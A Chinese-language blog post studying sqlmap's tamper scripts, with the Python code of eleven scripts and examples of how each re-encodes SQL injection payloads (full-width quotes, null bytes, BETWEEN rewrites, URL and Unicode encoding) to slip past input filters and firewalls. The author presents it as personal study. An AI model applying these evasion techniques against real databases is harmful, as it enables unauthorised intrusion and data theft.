

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="reader-l">
  <meta name="keywords" content="reader-l&#39;s blog">
  <title>sqlmap-tamper脚本了解 - reader-l&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/Links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/List/">
                <i class="iconfont icon-link-fill"></i>
                List
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="sqlmap-tamper脚本了解">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-06-15 09:36" pubdate>
        2020年6月15日 上午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      6.9k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      126
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">sqlmap-tamper脚本了解</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：2020年6月17日 上午
                
              </p>
            
            <div class="markdown-body">
              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    想通过探究sqlmap中的tamper脚本他们是如何执行绕过的来，拓展自己对绕过的技巧的扩充（其实是想要用sqlmap的tamper脚本的时候，可以查看。。。。）</p>
<h1 id="2-探究"><a href="#2-探究" class="headerlink" title="2.探究"></a>2.探究</h1><h2 id="1-0x2char-py"><a href="#1-0x2char-py" class="headerlink" title="1.0x2char.py"></a>1.0x2char.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    <span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">r&quot;\b0x([0-9a-f]+)\b&quot;</span>, retVal):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(match.group(<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">2</span>:<br>            result = <span class="hljs-string">&quot;CONCAT(%s)&quot;</span> % <span class="hljs-string">&#x27;,&#x27;</span>.join(<span class="hljs-string">&quot;CHAR(%d)&quot;</span> % <span class="hljs-built_in">ord</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> match.group(<span class="hljs-number">1</span>).decode(<span class="hljs-string">&quot;hex&quot;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            result = <span class="hljs-string">&quot;CHAR(%d)&quot;</span> % <span class="hljs-built_in">ord</span>(match.group(<span class="hljs-number">1</span>).decode(<span class="hljs-string">&quot;hex&quot;</span>))<br>        retVal = retVal.replace(match.group(<span class="hljs-number">0</span>), result)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用等效的CONCAT（CHAR（），…）对应项替换每个（MySQL）x-lt-hex-gt-编码字符串"><a href="#1-作用：用等效的CONCAT（CHAR（），…）对应项替换每个（MySQL）x-lt-hex-gt-编码字符串" class="headerlink" title="1.作用：用等效的CONCAT（CHAR（），…）对应项替换每个（MySQL）x&lt;hex&gt;编码字符串"></a>1.作用：用等效的<code>CONCAT（CHAR（），…）</code>对应项替换每个（MySQL）<code>x&lt;hex&gt;</code>编码字符串</h3><p><img src="/2020/06/15/sqlmap-tamper%E8%84%9A%E6%9C%AC%E4%BA%86%E8%A7%A3/1.png" srcset="/img/loading.gif"></p>
<h3 id="2-要求："><a href="#2-要求：" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL<br></code></pre></td></tr></table></figure>
<h2 id="2-apostrophemask-py"><a href="#2-apostrophemask-py" class="headerlink" title="2.apostrophemask.py"></a>2.apostrophemask.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> payload.replace(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&quot;%EF%BC%87&quot;</span>) <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">else</span> payload<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将单引号-39-替换为其UTF-8全宽对应字符，用于过滤了单引号的情况。"><a href="#1-作用：将单引号-39-替换为其UTF-8全宽对应字符，用于过滤了单引号的情况。" class="headerlink" title="1.作用：将单引号&#39;替换为其UTF-8全宽对应字符，用于过滤了单引号的情况。"></a>1.作用：将单引号<code>&#39;</code>替换为其UTF-8全宽对应字符，用于过滤了单引号的情况。</h3><p><code>1 AND &#39;1&#39;=&#39;1</code> —–&gt;<code>1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</code></p>
<h2 id="3-apostrophenullencode-py"><a href="#3-apostrophenullencode-py" class="headerlink" title="3.apostrophenullencode.py"></a>3.apostrophenullencode.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> payload.replace(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&quot;%00%27&quot;</span>) <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">else</span> payload<br></code></pre></td></tr></table></figure>
<h3 id="1-作用-将单引号换成非法的双unicode对应字符，用于过滤了单引号的情况。"><a href="#1-作用-将单引号换成非法的双unicode对应字符，用于过滤了单引号的情况。" class="headerlink" title="1.作用:将单引号换成非法的双unicode对应字符，用于过滤了单引号的情况。"></a>1.作用:将单引号换成非法的双unicode对应字符，用于过滤了单引号的情况。</h3><p><code>1 AND &#39;1&#39;=&#39;1</code>——&gt;<code>1 AND %00%271%00%27=%00%271</code></p>
<h2 id="4-appendnullbyte-py"><a href="#4-appendnullbyte-py" class="headerlink" title="4.appendnullbyte.py"></a>4.appendnullbyte.py</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s%%00&quot;</span> % payload <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">else</span> payload<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：在payload后面增加一个-00空字符"><a href="#1-作用：在payload后面增加一个-00空字符" class="headerlink" title="1.作用：在payload后面增加一个%00空字符"></a>1.作用：在payload后面增加一个<code>%00</code>空字符</h3><p>   <code>1 AND 1=1</code>   ——&gt;<code>1 AND 1=1%00</code></p>
<h3 id="2-要求：-1"><a href="#2-要求：-1" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">Requirement</span>:<br>    * Microsoft Access<br></code></pre></td></tr></table></figure>
<h2 id="5-base64encode-py"><a href="#5-base64encode-py" class="headerlink" title="5.base64encode.py"></a>5.base64encode.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> base64.b64encode(payload.encode(UNICODE_ENCODING)) <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">else</span> payload<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将所有字符用base64进行编码"><a href="#1-作用：将所有字符用base64进行编码" class="headerlink" title="1.作用：将所有字符用base64进行编码"></a>1.作用：将所有字符用base64进行编码</h3><p><code>1&#39; AND SLEEP(5)#</code> ——-&gt;<code>MScgQU5EIFNMRUVQKDUpIw==</code></p>
<h2 id="6-between-py"><a href="#6-between-py" class="headerlink" title="6.between.py"></a>6.between.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    match = re.search(<span class="hljs-string">r&quot;(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^&gt;]+?)\s*&gt;\s*([^&gt;]+)\s*\Z&quot;</span>, payload)<br><br>    <span class="hljs-keyword">if</span> match:<br>        _ = <span class="hljs-string">&quot;%s %s NOT BETWEEN 0 AND %s&quot;</span> % (match.group(<span class="hljs-number">2</span>), match.group(<span class="hljs-number">4</span>), match.group(<span class="hljs-number">5</span>))<br>        retVal = retVal.replace(match.group(<span class="hljs-number">0</span>), _)<br>    <span class="hljs-keyword">else</span>:<br>        retVal = re.sub(<span class="hljs-string">r&quot;\s*&gt;\s*(\d+|&#x27;[^&#x27;]+&#x27;|\w+\(\d+\))&quot;</span>, <span class="hljs-string">r&quot; NOT BETWEEN 0 AND \g&lt;1&gt;&quot;</span>, payload)<br><br>    <span class="hljs-keyword">if</span> retVal == payload:<br>        match = re.search(<span class="hljs-string">r&quot;(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*(\w+)\s*&quot;</span>, payload)<br><br>        <span class="hljs-keyword">if</span> match:<br>            _ = <span class="hljs-string">&quot;%s %s BETWEEN %s AND %s&quot;</span> % (match.group(<span class="hljs-number">2</span>), match.group(<span class="hljs-number">4</span>), match.group(<span class="hljs-number">5</span>), match.group(<span class="hljs-number">5</span>))<br>            retVal = retVal.replace(match.group(<span class="hljs-number">0</span>), _)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将大于符号-gt-和等号-用-between-语句替换，用于过滤了大于符号和等号的情况"><a href="#1-作用：将大于符号-gt-和等号-用-between-语句替换，用于过滤了大于符号和等号的情况" class="headerlink" title="1.作用：将大于符号(&gt;)和等号(=)用 between 语句替换，用于过滤了大于符号和等号的情况"></a>1.作用：将大于符号(&gt;)和等号(=)用 between 语句替换，用于过滤了大于符号和等号的情况</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">AND</span> A &gt; B	<span class="hljs-keyword">to</span>	<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> A <span class="hljs-keyword">NOT</span> BETWEEN <span class="hljs-number">0</span> <span class="hljs-keyword">AND</span> B<br><br><span class="hljs-symbol">1 </span><span class="hljs-keyword">AND</span> A = B	<span class="hljs-keyword">to</span>	<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> A BETWEEN B <span class="hljs-keyword">AND</span> B<br></code></pre></td></tr></table></figure>


<h2 id="7-bluecoat-py"><a href="#7-bluecoat-py" class="headerlink" title="7.bluecoat.py"></a>7.bluecoat.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process</span>(<span class="hljs-params">match</span>):</span><br>    word = match.group(<span class="hljs-string">&#x27;word&#x27;</span>)<br>    <span class="hljs-keyword">if</span> word.upper() <span class="hljs-keyword">in</span> kb.keywords:<br>        <span class="hljs-keyword">return</span> match.group().replace(word, <span class="hljs-string">&quot;%s%%09&quot;</span> % word)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> match.group()<br><br>retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = re.sub(<span class="hljs-string">r&quot;\b(?P&lt;word&gt;[A-Z_]+)(?=[^\w(]|\Z)&quot;</span>, <span class="hljs-keyword">lambda</span> match: process(match), retVal)<br>    retVal = re.sub(<span class="hljs-string">r&quot;\s*=\s*&quot;</span>, <span class="hljs-string">&quot; LIKE &quot;</span>, retVal)<br>    retVal = retVal.replace(<span class="hljs-string">&quot;%09 &quot;</span>, <span class="hljs-string">&quot;%09&quot;</span>)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>


<h3 id="1-作用：用有效的随机空白字符替换SQL语句之后的空格字符。之后用like运算符替换字符-用于过滤空格和等号的情况"><a href="#1-作用：用有效的随机空白字符替换SQL语句之后的空格字符。之后用like运算符替换字符-用于过滤空格和等号的情况" class="headerlink" title="1.作用：用有效的随机空白字符替换SQL语句之后的空格字符。之后用like运算符替换字符=,用于过滤空格和等号的情况"></a>1.作用：用有效的随机空白字符替换SQL语句之后的空格字符。之后用<code>like</code>运算符替换字符<code>=</code>,用于过滤空格和等号的情况</h3><p><code>SELECT id FROM users WHERE id = 1</code>——–&gt;<code>SELECT%09id FROM%09users WHERE%09id LIKE 1</code></p>
<h2 id="8-chardoubleencode-py"><a href="#8-chardoubleencode-py" class="headerlink" title="8.chardoubleencode.py"></a>8.chardoubleencode.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    i = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(payload):<br>        <span class="hljs-keyword">if</span> payload[i] == <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> (i &lt; <span class="hljs-built_in">len</span>(payload) - <span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> string.hexdigits <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">2</span>:i + <span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> string.hexdigits:<br>            retVal += <span class="hljs-string">&#x27;%%25%s&#x27;</span> % payload[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">3</span>]<br>            i += <span class="hljs-number">3</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += <span class="hljs-string">&#x27;%%25%.2X&#x27;</span> % <span class="hljs-built_in">ord</span>(payload[i])<br>            i += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：对payload进行二次编码，先对payload每一个字符进行url编码，然后将每一个编码后的字符前的-用-25（-的url编码）进行替换"><a href="#1-作用：对payload进行二次编码，先对payload每一个字符进行url编码，然后将每一个编码后的字符前的-用-25（-的url编码）进行替换" class="headerlink" title="1.作用：对payload进行二次编码，先对payload每一个字符进行url编码，然后将每一个编码后的字符前的%用%25（%的url编码）进行替换"></a>1.作用：对payload进行二次编码，先对payload每一个字符进行url编码，然后将每一个编码后的字符前的<code>%</code>用<code>%25</code>（%的url编码）进行替换</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">SELECT ------&gt; <span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%45</span><span class="hljs-variable">%43</span><span class="hljs-variable">%54</span> --------&gt;<span class="hljs-variable">%2553</span><span class="hljs-variable">%2545</span><span class="hljs-variable">%254</span>C<span class="hljs-variable">%2545</span><span class="hljs-variable">%2543</span><span class="hljs-variable">%2554</span><br></code></pre></td></tr></table></figure>




<h2 id="9-charencode-py"><a href="#9-charencode-py" class="headerlink" title="9.charencode.py"></a>9.charencode.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    i = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(payload):<br>        <span class="hljs-keyword">if</span> payload[i] == <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> (i &lt; <span class="hljs-built_in">len</span>(payload) - <span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> string.hexdigits <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">2</span>:i + <span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> string.hexdigits:<br>            retVal += payload[i:i + <span class="hljs-number">3</span>]<br>            i += <span class="hljs-number">3</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += <span class="hljs-string">&#x27;%%%.2X&#x27;</span> % <span class="hljs-built_in">ord</span>(payload[i])<br>            i += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：对payload进行一次url编码"><a href="#1-作用：对payload进行一次url编码" class="headerlink" title="1.作用：对payload进行一次url编码"></a>1.作用：对payload进行一次url编码</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">SELECT -&gt; %53%45%4C%45%43%5<br></code></pre></td></tr></table></figure>


<h2 id="10-charunicodeencode-py"><a href="#10-charunicodeencode-py" class="headerlink" title="10.charunicodeencode.py"></a>10.charunicodeencode.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    i = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(payload):<br>        <span class="hljs-keyword">if</span> payload[i] == <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> (i &lt; <span class="hljs-built_in">len</span>(payload) - <span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> string.hexdigits <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">2</span>:i + <span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> string.hexdigits:<br>            retVal += <span class="hljs-string">&quot;%%u00%s&quot;</span> % payload[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">3</span>]<br>            i += <span class="hljs-number">3</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += <span class="hljs-string">&#x27;%%u%.4X&#x27;</span> % <span class="hljs-built_in">ord</span>(payload[i])<br>            i += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>


<h3 id="1-作用：Unicode-URL编码给定payload中的所有字符。"><a href="#1-作用：Unicode-URL编码给定payload中的所有字符。" class="headerlink" title="1.作用：Unicode URL编码给定payload中的所有字符。"></a>1.作用：Unicode URL编码给定payload中的所有字符。</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-meta">SELECT</span> -&gt; <span class="hljs-name">%u0053</span><span class="hljs-name">%u0045</span><span class="hljs-name">%u004C</span><span class="hljs-name">%u0045</span><span class="hljs-name">%u0043</span><span class="hljs-name">%u0054</span><br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-2"><a href="#2-要求：-2" class="headerlink" title="2.要求："></a>2.要求：</h3><p>适用所有数据库，但是要求以下环境。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Requirement:<br><span class="hljs-bullet">    *</span> ASP<br><span class="hljs-bullet">    *</span> ASP.NET<br></code></pre></td></tr></table></figure>




<h2 id="11-charunicodeescape-py"><a href="#11-charunicodeescape-py" class="headerlink" title="11.charunicodeescape.py"></a>11.charunicodeescape.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    i = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(payload):<br>        <span class="hljs-keyword">if</span> payload[i] == <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> (i &lt; <span class="hljs-built_in">len</span>(payload) - <span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> string.hexdigits <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">2</span>:i + <span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> string.hexdigits:<br>            retVal += <span class="hljs-string">&quot;\\u00%s&quot;</span> % payload[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">3</span>]<br>            i += <span class="hljs-number">3</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += <span class="hljs-string">&#x27;\\u%.4X&#x27;</span> % <span class="hljs-built_in">ord</span>(payload[i])<br>            i += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：Unicode转义给定payload中的非编码字符（未处理已编码的字符）"><a href="#1-作用：Unicode转义给定payload中的非编码字符（未处理已编码的字符）" class="headerlink" title="1.作用：Unicode转义给定payload中的非编码字符（未处理已编码的字符）"></a>1.作用：Unicode转义给定payload中的非编码字符（未处理已编码的字符）</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SELECT</span> -&gt; \u<span class="hljs-number">0053</span>\u<span class="hljs-number">0045</span>\u<span class="hljs-number">004</span>C\u<span class="hljs-number">0045</span>\u<span class="hljs-number">0043</span>\u<span class="hljs-number">0054</span><br></code></pre></td></tr></table></figure>


